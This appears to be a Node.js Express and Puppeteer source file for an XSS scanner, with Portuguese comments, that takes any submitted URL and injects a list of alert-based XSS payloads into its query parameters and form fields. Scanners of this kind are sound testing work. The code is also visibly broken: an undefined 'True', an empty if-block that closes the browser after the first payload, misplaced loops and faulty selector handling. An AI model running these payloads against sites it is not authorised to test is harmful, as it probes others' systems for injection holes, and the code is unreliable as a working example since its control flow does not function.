const express = require("express");
const bodyParser = require("body-parser")
const queryString = require("query-string")
const puppeterr = require("puppeteer")
const http = require("http")

const app =  express();
const server = http.createServer(app);

app.get("/", (req, res) => {
    res.send("Funcionando")
})

app.get("/scanner", async (req, res) => {
    let url = req.query.url; 
    //res.send("Analisando URl" + url)  
    console.log("Iniciando análise da url" + url)
    let  passuixss = await validaXss(url)
})

server.listen(process.env.PORT || 4000, () => {
    console.log("Server iniciado")
})

const MALICIOUS_SCRIPT = [

    '<script>alert("xss")</script>',
    '<image src=1 href=1 onerror="javascript:alert(1)"></image>',
    "')%3Balert(1)%3Bvar b=('",
    '<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>',
    '<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>',
    '<img src="http://inexist.ent" onerror="javascript:alert(1)"/>',

];

async function validaXss(url){

    const browser = await puppeterr.launch({
        headless: false,
        defaultViewport: null,
        args:['--start-maximized']

    })
    const page = await browser.newPage();
    await page.goto(url, {waitUntil: "networkidle2"})
    const formsArray = await page.$$('form');
    const page2 = await browser.newPage();
    let estaVulneravel = false;
    page2.on('dialog', async (dialog) => {
        estaVulneravel = True;
        dialog.accept();

    })

    for(script in MALICIOUS_SCRIPT){

        let newUrl = validaUrl(url, MALICIOUS_SCRIPT[script])
        if(newUrl != ""){
            await page2.goto(newUrl)
        }
        if(estaVulneravel){}
            browser.close();
            return True;
        }
        for( i in formsArray){
            try{
                await page2.goto(url, {waitUntil: "networkidle2", timeout: 6000});
                let inputsArray = await formsArray[i]
                .$$eval('input[type="text"], input[type="search"], input:not([type]), textarea',
                (inputs) => 
                    inputs.map((input) => input.id ? '#' + input.id: '.' + input.className));
                for(input in inputsArray){
                    let selector = inputsArray[input]
                    if(selector.charAt(0) == ".") {
                        selector = selector.split(' ');
                    }
                    await page2.type(selector, MALICIOUS_SCRIPT[script], {delay: 20});
                }
            }
            catch(err){


            }
        }

    }
}

const validaUrl = (url, script) => {
    let temp = {};
    let newUrl = "";
    temp = url.split('?');
    let tmp = queryString.parse(temp[1]);
    let key = Object.keys(tmp);
    if(temp[1]){
        newUrl = temp[0] + "?";
        for(let k in tmp){
            if(key[0] === k){
                newUrl = newUrl +  k + "=" + script;
                
            }
            else{
                newUrl = newUrl + "&" + k + "=" + script;

            }


        }
    }

    return newUrl

}
